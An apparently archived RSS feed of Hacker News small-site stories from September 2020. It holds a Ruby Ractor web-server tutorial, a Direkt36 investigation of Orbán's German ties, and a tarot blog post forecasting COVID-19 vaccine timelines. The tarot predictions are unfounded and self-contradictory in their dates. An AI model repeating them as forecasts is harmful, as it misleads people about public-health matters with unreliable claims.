<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 21 Sep 2020 16:25:23 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 21 Sep 2020 16:25:23 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Writing a Ractor-based web server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533152">thread link</a>) | @todsacerdoti
<br/>
September 20, 2020 | http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/ | <a href="https://web.archive.org/web/*/http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><span>08 Sep 2020</span></p><p>Ractor, the new concurrency primitive in Ruby, <a href="https://github.com/ruby/ruby/pull/3365" target="_blank">has been merged</a> to the upstream few days ago. I’ve been following that PR and watching the author’s <a href="https://www.youtube.com/watch?v=40t8EPpnujg&amp;list=PLbFmgWm555yZeLpdOLhYwORIF9UjBAFHw&amp;index=17" target="_blank">talk at RubyKaigi</a> (in Japanese, I wasn’t able to find the translated version but it should be available <em>somewhere</em>), which got me excited to try Ractor myself.</p>

<p>A web application server is the first thing that comes to mind when playing with concurrency. On top of that, not too long ago I’ve implemented TCP servers in Rust and Go, so I got curious to write a <strong>simple web server using Ractor</strong>.</p>

<p>Let’s dive in!</p>

<h2 id="whats-in-a-web-server">What’s in a web server?</h2>

<p>A web server is something that accepts a TCP socket, reads from it, parses HTTP headers and responds with HTTP body. It’s a text-based protocol that is easy to implement.</p>

<p>Here’s a sample request (what you’d read from the socket):</p>

<div><div><pre><code>GET / HTTP/1.1
Host: localhost:10000
User-Agent: curl/7.64.1
Accept: */*
</code></pre></div></div>

<p>And a sample response (what you’d write):</p>

<div><div><pre><code>HTTP/1.1 200
Content-Type: text/html

Hello world
</code></pre></div></div>

<p>We will start by grabbing a gist from the <a href="https://blog.appsignal.com/2016/11/23/ruby-magic-building-a-30-line-http-server-in-ruby.html" target="_blank">Building a 30 line HTTP server in Ruby</a> post by AppSignal.</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>
<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>

<span>while</span> <span>session</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span>request</span> <span>=</span> <span>session</span><span>.</span><span>gets</span>
  <span>puts</span> <span>request</span>

  <span>session</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"Hello world! The time is </span><span>#{</span><span>Time</span><span>.</span><span>now</span><span>}</span><span>"</span>

  <span>session</span><span>.</span><span>close</span>
<span>end</span>
</code></pre></div></div>

<h2 id="starting-with-ractor">Starting with Ractor</h2>

<p>To get started with Ractor, I recommend to read the <a href="https://github.com/ko1/ruby/blob/dc7f421bbb129a7288fade62afe581279f4d06cd/doc/ractor.md" target="_blank">doc</a> in the ruby repo.</p>

<p>Now, let’s wrap the example from above into Ractors.</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>
<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
    <span>loop</span> <span>do</span>
      <span># receive TCPSocket</span>
      <span>s</span> <span>=</span> <span>Ractor</span><span>.</span><span>recv</span>

      <span>request</span> <span>=</span> <span>s</span><span>.</span><span>gets</span>
      <span>puts</span> <span>request</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world! The time is </span><span>#{</span><span>Time</span><span>.</span><span>now</span><span>}</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>loop</span> <span>do</span>
  <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span># pass TCPSocket to one of the workers</span>
  <span>workers</span><span>.</span><span>sample</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>We start the number of workers that equals the number of CPUs and have the main thread to listen to connections on the socket and send accepted connection to a random Ractor. We can validate that it works as expect by making a request with <code>curl</code>.</p>

<p>However, distributing requests among workers using <code>workers.sample</code> is not very efficient. That random worker might still be busy serving the previous request. We’d rather have workers pull from a shared queue where we’d send all requests.</p>

<p>I wanted to make that part better but I didn’t find any Ractor-friendly queue implementation. However, the <a href="https://github.com/ko1/ruby/blob/dc7f421bbb129a7288fade62afe581279f4d06cd/doc/ractor.md" target="_blank">doc</a> suggesting using a pipe like a queue. Let’s try that!</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>

<span># pipe aka a queue</span>
<span>pipe</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
  <span>loop</span> <span>do</span>
    <span>Ractor</span><span>.</span><span>yield</span><span>(</span><span>Ractor</span><span>.</span><span>recv</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>

      <span>data</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span>
      <span>puts</span> <span>data</span><span>.</span><span>inspect</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
<span>loop</span> <span>do</span>
  <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span>pipe</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>It worked! By using the pipe I was able to make all workers to pull for sockets which improved the load balancing part.</p>

<p>What’s still not great is that there’s nothing that monitors workers in case one of them unexpectedly dies. And similar to <a href="https://github.com/puma/puma/blob/master/docs/architecture.md" target="_blank">Puma’s architecture</a>, it would be more efficient to have a separate thread to wait for sockets to become ready to read before passing them to actual workers.</p>

<p>I was able to move listener into its own Ractor and to make the main thread to watch all Ractors:</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>

<span>pipe</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
  <span>loop</span> <span>do</span>
    <span>Ractor</span><span>.</span><span>yield</span><span>(</span><span>Ractor</span><span>.</span><span>recv</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>
      <span>puts</span> <span>"taken from pipe by </span><span>#{</span><span>Ractor</span><span>.</span><span>current</span><span>}</span><span>"</span>

      <span>data</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span>
      <span>puts</span> <span>data</span><span>.</span><span>inspect</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>listener</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
  <span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
  <span>loop</span> <span>do</span>
    <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
    <span>pipe</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>loop</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>select</span><span>(</span><span>listener</span><span>,</span> <span>*</span><span>workers</span><span>)</span>
  <span># if the line above returned, one of the workers or the listener has crashed</span>
<span>end</span>
</code></pre></div></div>

<p>Again, it worked!</p>

<p>The next step of implementing a web server would be to bake a HTTP parser to read request headers. There’s a <a href="https://github.com/cotag/http-parser" target="_blank">http-parser</a> gem that is using a C extension, and I’ve heard that is not supported by Ractor yet.</p>

<p>I found an HTTP parser that comes as a part of WEBrick which is a built into Ruby’s standard library.</p>

<p>I tried the following snippet:</p>

<div><div><pre><code><span>require</span> <span>'webrick'</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>

      <span># raises "can not access non-sharable objects in constant HTTP by non-main Ractors (NameError)"</span>
      <span>req</span> <span>=</span> <span>WEBrick</span><span>::</span><span>HTTPRequest</span><span>.</span><span>new</span><span>(</span><span>WEBrick</span><span>::</span><span>Config</span><span>::</span><span>HTTP</span><span>)</span>
      <span>req</span><span>.</span><span>parse</span><span>(</span><span>s</span><span>)</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p><code>WEBrick::Config::HTTP</code> turned to be a mutable hash with some configuration objects. Since that constant and a hash were initialized in the main thread, it wasn’t allowed to be safely used from ractors. I worked around by inlining the hash definition but then I hit another non-shareable constant referenced from the WEBrick code that wasn’t too easy to inline.</p>

<p>This is probably the part that will improve on the upstream very soon. After all, this is the earliest Ractor implementation.</p>

<h2 id="the-end">The end</h2>

<p>I’m really excited about new concurrency primitives like Ractor getting pushed into Ruby’s upstream.</p>

<p>The Ractor model seems powerful and ready for experimental use. Within the next 6 months (Ruby 3.0 release is scheduled for December), I foresee a Ractor-based web server to come out to leverage this feature and get the most out of server CPUs. This is a great opportunity to learn concurrent programming and to contribute to the Ruby community.</p>

<p>For those curious to try Ractor, I’d suggest to try implementing other things that benefit from parallel execution, for instance a background job processor.</p>

<p>To try Ractor, you’ll need to build Ruby from the upstream. Read my previous posts (<a href="https://kirshatrov.com/2020/01/11/contributing-to-mri/" target="_blank">Contributing to Ruby MRI</a>) to learn about how to do that.</p>

</div></div>]]>
            </description>
            <link>http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533152</guid>
            <pubDate>Sun, 20 Sep 2020 10:35:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When will Covid-19 Vaccine be available? Answered by Tarot With Raaginni]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532977">thread link</a>) | @imshashank
<br/>
September 20, 2020 | https://raaginni.com/blog/tarot/when-will-covid-19-vaccine-be-available-answered-by-tarot-with-raaginni/2783/ | <a href="https://web.archive.org/web/*/https://raaginni.com/blog/tarot/when-will-covid-19-vaccine-be-available-answered-by-tarot-with-raaginni/2783/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2783" itemtype="http://schema.org/Article" itemscope="itemscope"><div><div><div itemprop="articleBody"><p>The world is fighting COVID-19 pandemic and we all are just praying it to get over soon but as my cards show me the pandemic is here to stay at least until June of next year (2021).</p><p>I have received a lot of requests for updates on the coronavirus pandemic. So, I did some tarot readings for the COVID -19 pandemic and this is what cards told me:</p><figure><img loading="lazy" width="820" height="312" src="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/2.jpg" alt="" srcset="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/2.jpg 820w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/2-300x114.jpg 300w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/2-768x292.jpg 768w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/2-600x228.jpg 600w" sizes="(max-width: 820px) 100vw, 820px"></figure><h2>COVID-19 Tarot Predictions (Global):</h2><ul><li>COVID-19 Vaccine research will have a breakthrough in October 2020. (Like I predicted in the March Video that you can see <a href="https://youtu.be/_KJt0ccS1vg" target="_blank" rel="noopener">here</a>)</li><li>The coronavirus vaccine will be in the market by <span>January 2020</span> but the supply will be short and there will be a lot of struggle/fight to get the vaccine in various countries.</li><li>There will be a big black market for the vaccine.</li><li><span>Most people will get the COVID-19 vaccine by March 2021</span></li><li><span>Moderna</span> is the most likely candidate to have an approved vaccine but there will be other companies as well.</li><li>In the beginning, Moderna’s vaccine will face some issues &amp; glitches but then they will fix it, resume production &amp; even supply vaccines to other countries as well.</li><li>Moderna will start production of the vaccine much earlier (October 2020) but will face a lot of problems. The vaccine production will resume back in November &amp; December 2020.</li><li>For me personally, My cards showed me that I will get the vaccine in March 2020 but I will not get it in India. I will get the vaccine in some other country as I will most likely be traveling. (Strange eeehh…)</li></ul><hr><h2>Coronavirus Vaccine Availability by region:</h2><p>Everywhere the vaccines will be given first to VIPs, government &amp; health workers. I see a lot of politics, scams &amp; scandals in regard to the vaccine especially in countries like India.</p><h3>USA COVID-19 vaccine availability date:</h3><div><figure><img loading="lazy" src="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/Coronavirus-in-the-US.jpg" alt="" width="526" height="394" srcset="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/Coronavirus-in-the-US.jpg 800w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/Coronavirus-in-the-US-300x225.jpg 300w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/Coronavirus-in-the-US-768x576.jpg 768w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/Coronavirus-in-the-US-600x450.jpg 600w" sizes="(max-width: 526px) 100vw, 526px"><figcaption>USA COVID-19 vaccine availability date:</figcaption></figure></div><ul><li>USA will start giving vaccines secretly as early as September 2020 to VIPs &amp; some other people in the USA but they will run into some problems and will stop that.</li><li>The vaccine will be available publically by <span>December 2020</span> only.</li></ul><hr><h3>India COVID-19 vaccine availability date:</h3><ul><li>When the vaccine will enter the markets in India there will be a big scam and vaccines won’t reach people easily.</li><li>I see middlemen/suppliers doing a lot of scams &amp; scandals.</li><li>The vaccine will be in the market in Jan 2021 but won’t be easily accessible.</li><li>People will start getting the vaccine only by March to April 2020 But really vaccine will be by only available by May 2021 and even later.</li></ul><hr><h3>Europe COVID-19 vaccine availability date:</h3><figure><img loading="lazy" src="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date--1024x768.jpeg" alt="" width="590" height="442" srcset="https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date--1024x768.jpeg 1024w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date--300x225.jpeg 300w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date--768x576.jpeg 768w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date--600x450.jpeg 600w, https://256057-939361-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/09/India-COVID-19-vaccine-availability-date-.jpeg 1200w" sizes="(max-width: 590px) 100vw, 590px"><figcaption>India COVID-19 vaccine availability date:</figcaption></figure><ul><li>COVID vaccine will be available by December 2020 but will only be accessible to rich &amp; powerful European countries.</li><li>Germany will get the vaccine by Dec 2021.</li><li>By March-April the vaccine will be generally available.</li><li>By April all of Europe will have access to the vaccine.</li></ul><hr><p>So looks like this pandemic will be over by July 2021 across the world. We have been in this together for over 7 months now. So a few months more and we can go back to traveling, exploring and being normal back again.</p><p>Would you like to learn more about your future? Want to get clarity on someone’s intentions?<br>Book a Tarot reading today with me! Go to-&gt; <a href="https://raaginni.com/">http://raaginni.com/</a></p><p> You can use the calendar on this page to book a tarot reading with me.</p><figure><p><iframe title="Coronavirus: How will it affect India &amp; the world? Tarot card reading by Raaginni" width="640" height="360" src="https://www.youtube.com/embed/_KJt0ccS1vg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure></div></div></div></article></div>]]>
            </description>
            <link>https://raaginni.com/blog/tarot/when-will-covid-19-vaccine-be-available-answered-by-tarot-with-raaginni/2783/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532977</guid>
            <pubDate>Sun, 20 Sep 2020 09:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Orbán played Germany, Europe's great power]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532961">thread link</a>) | @vr46
<br/>
September 20, 2020 | https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/ | <a href="https://web.archive.org/web/*/https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>In October 2017, important figures of German and international business and political life gathered at a reception in a glass-walled hall on one of the upper floors of Frankfurt’s tallest skyscraper. At the event, one of the top executives of a German automobile manufacturing group, warmed and loosened up by some glasses of wine, started entertaining those around him with anecdotes. After some time, the conversation was directed to Hungary.</p>
<p>The senior automotive manager bragged about the fact that the executives of his company could call Hungarian Foreign Minister Péter Szijjártó at any time if they had any requests regarding their factories in Hungary. He then added that if necessary, they could even speak directly to Viktor Orbán – in fact, he said, the Hungarian Prime Minister had already helped them with a specific case.</p>
<p>Two years earlier, in September 2015, Germany’s automotive industry was hit by its biggest scandal ever. It was found that Volkswagen Group’s (VW) diesel cars used software manipulation to cheat on emission tests for many years (later several other German and non-German companies were found to have manipulated their data in a similar way). As a result of the scandal, the price of VW shares began to plummet and it looked like several companies could be seriously endangered, forcing them to close factories and cut jobs.</p>
<p>At the reception in Frankfurt, the German automotive executive claimed that the diesel emissions scandal had become so embarrassing for the federal government after a while that they felt the German state was starting to back out from behind them. Executives of his group of companies then turned directly to Viktor Orbán, asking him to represent the interests of car manufacturers in the European Council that was currently discussing the matter. Viktor Orbán agreed to help and kept his promise, the German automotive executive said with satisfaction.</p>
<div itemscope="" itemtype="http://schema.org/VideoObject"><p><iframe src="//www.youtube.com/embed/xCtaFfcysH4?iv_load_policy=3&amp;modestbranding=1&amp;rel=0&amp;wmode=transparent&amp;autoplay=0" frameborder="0" scrolling="no" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p></div>
<p>Since the beginning of 2016, the European Council, which represents governments of European Union member states, has repeatedly addressed the reform of vehicle emission rules. However, Germany has been trying to soften stricter regulations in alliance with Italy and Eastern European member states with significant German automotive investments. In September 2017, a new regulation finally came into force but it was full of loopholes, applied only to new cars not yet on the roads, and made many other concessions to automakers.</p>
<p>A German business source present at the Frankfurt reception told Direkt36 about the lobbying and the role of Orbán, adding that there was nothing glaring about it. “Representatives of every important company say they have Szijjártó and others’ phone numbers,” the source said, adding that top executives of several German carmakers told similar stories, and that they all</p>
<blockquote><p>“absolutely feel that the Hungarian government is in their pockets.”</p></blockquote>
<p>The spokesperson of Viktor Orbán and the Ministry of Foreign Affairs and Trade headed by Szijjártó did not respond to our request.</p>
<p>However, a former senior official in the Orbán government confirmed that “Viktor Orbán defends the interests of German car manufacturers in the European Council”. Nevertheless, according to the source, there is nothing surprising in this, as Hungarian governments have always been accommodating to German carmakers. Following the outbreak of the diesel emissions scandal, Mihály Varga, Minister of Finance of the Orbán government, said that 2-2.5 million of the Volkswagen Group’s 11 million diesel cars with cheating engines were manufactured at the Audi plant in the city of Győr and that “the government’s most important goal is maintaining jobs in the automotive industry and preserving the stability that the automotive industry provides in Hungary”.</p>
<p>The above story is a good example of how a relationship based on mutual benefits and dependence has developed between German policy makers, influential companies in German industry and the Hungarian government over the years and decades. German carmakers are the number one engine of Hungarian economic growth and, through this, of the Orbán government’s political successes. According to data by the Hungarian Central Statistical Office, car manufacturing accounts for 4.5% of Hungary’s GDP and suppliers working for large car manufacturers account for another 5-8%. This means that every eighth to tenth forint produced in Hungary has to do something with the Germany-dominated car industry.</p>
<p>Now is a particularly sensitive period in Hungarian-German relations. In the coming months, political issues determining the long-term European bargaining power of the Orbán government and Hungary will be settled in the European Union. In these debates, Viktor Orbán’s German allies will have the final say, and although they have repeatedly criticized decisions of the Hungarian government, they have so far refrained from acting really hard.</p>
<p>Direkt36 uncovered details of this intricate system of relationships, the interests that drive it, and the key players in a months-long investigation. We found how decades of personal relationships control Orbán’s maneuvers in Germany; how German companies give up much-talked-about democratic values ​​if it is in their business interests; and, for example, that the Hungarian government was able to prevent Jewish leaders in Budapest from sharing their concerns with Angela Merkel.</p>
<p>In our research, we had in-depth background conversations with two dozen sources — current and former government officials, diplomats, political intermediaries, business executives, and analysts. Most of them shared information about behind-the-scenes events if we did not write down their names.</p>
<h2>I. Orbán’s German patrons</h2>
<figure id="attachment_6438"><img src="https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001.jpeg" alt="" width="3868" height="2416" srcset="https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001.jpeg 3868w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-150x94.jpeg 150w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-300x187.jpeg 300w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-768x480.jpeg 768w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-1200x750.jpeg 1200w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-1177x735.jpeg 1177w" sizes="(max-width: 3868px) 100vw, 3868px"><figcaption>Source: kormany.hu</figcaption></figure>
<p>“Call the Count and tell him we’d like to visit him!” <span lang="EN">This is the task Viktor Orbán gave Gergely Prőhle on the night of his first election victory, on May 24, 1998. Prőhle was the head of the Budapest office of the Friedrich Naumann Foundation (ie the party foundation of the German Free Democratic Party, the FDP). </span> Four days later, the new prime minister-elect was already in Bonn, where executives of German industrial giants like Audi, Bosch or Siemens were waiting to meet him. Orbán reassured them, according to the Hungarian state news agency’s report, that a predictable economic environment awaits them, moreover, his government wants to increase foreign investment, primarily in manufacturing.</p>
<p>The meeting, which was organized in only matter of few days, was thanks to to Otto Graf Lambsdorff, the influential liberal politician and honorary president of the FDP, who was most often referred to by his acquaintances only as “the Count”. Lambsdorff had known Orban for a long time, he led the Liberal International when Fidesz became a member in 1992. During Orbán’s visit, Lambsdorff proudly talked to the German press about the future prime minister and boasted that he “has been watching Orbán’s political career since the regime change in Hungary and is very happy to support him”. Gergely Prőhle, who later also served as ambassador to Berlin and deputy secretary of state for foreign affairs under the Orbán government, told Direkt36 that “Lambsdorff had already started traveling to Eastern Europe before 1989 and had become Orbán’s first German patron. He was an infinitely smart person from whom much could be learned. The count saw the economic-political ties in light of a full historical context, he was a formidable personality”.</p>
<p><span lang="EN">The relationship between Orbán and Lambsdorff was so close that it even survived when Fidesz broke ties with the European political family the Count represented. Prőhle also wrote an article on Lambsdorff for <a href="https://www.valaszonline.hu/2019/12/05/ezt-a-libprohle-gergely-otto-graf-lambsdorff/">Valasz Online</a>. According to him, the Count watched Orbán’s politics turn conservative in the mid-1990s with some disappointment, but accepted the political realities. He also observed, how over time, leader of the Christian Democratic Union (CDU) Helmut Kohl became the most important point of reference for Orbán. At one point, Orbán explained to Lambsdorff that </span></p>
<blockquote><p><span lang="EN">“in order for him to maximize votes in Hungary, the liberal slogan is not good, and the Count understood that”. </span></p></blockquote>
<p><span lang="EN">However, the two politicians remained close friends, and later in 2009 Orbán was the only foreign guest at Lambsdorff’s private funeral.</span></p>
<p><span lang="EN">During his visit to Germany in May 1998, Orbán not only spoke to company executives, but also spent an hour and a half meeting with German Chancellor Helmut Kohl, then head of government for 16 years, who was facing a really close election a few months later. At that time, officials from the Hungarian foreign ministry, which was still under socialist leadership, advised Orbán to also meet Kohl’s challenger, Gerhard Schröder, because he seemed more likely to win the election. However, because of his loyalty to Kohl, “Orbán rejected this idea, while for example, the Polish Prime Minister did meet with Schröder. Schröder and his people didn’t forget this later, neither for the Poles, nor for us,” a former Hungarian foreign ministry official told Direkt36.</span></p>
<p><span lang="EN">It was a tight race, but Schröder eventually defeated Kohl. According to Sándor Peisch, who served as Hungarian ambassador to Berlin under the Socialist MSZP governments between 2003 and 2010, this was also the end of an era when the German leadership still looked at Hungary with gratitude for its role in the country’s reunification. An important milestone in the process leading to the fall of the Berlin Wall, was the opening of the Hungarian-Austrian border. It started in the summer of 1989 and was officially announced in September, paving the way for East German refugees to travel via Austria to West Germany. But “the SPD was never enthusiastic about reunification. At one of our meetings, for example, Chancellor Schröder began to complain about how much money it had costed,” Peisch told Direkt36.</span></p>
<p><span lang="EN">Viktor Orbán and Helmut Kohl thus ruled simultaneously for only a few months. While Lambsdorff was a true …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/">https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/</a></em></p>]]>
            </description>
            <link>https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532961</guid>
            <pubDate>Sun, 20 Sep 2020 09:50:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seeing things a different way; simple test for aphantasia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532946">thread link</a>) | @avoidboringppl
<br/>
September 20, 2020 | https://www.leonlinsx.com/aphantasia/ | <a href="https://web.archive.org/web/*/https://www.leonlinsx.com/aphantasia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
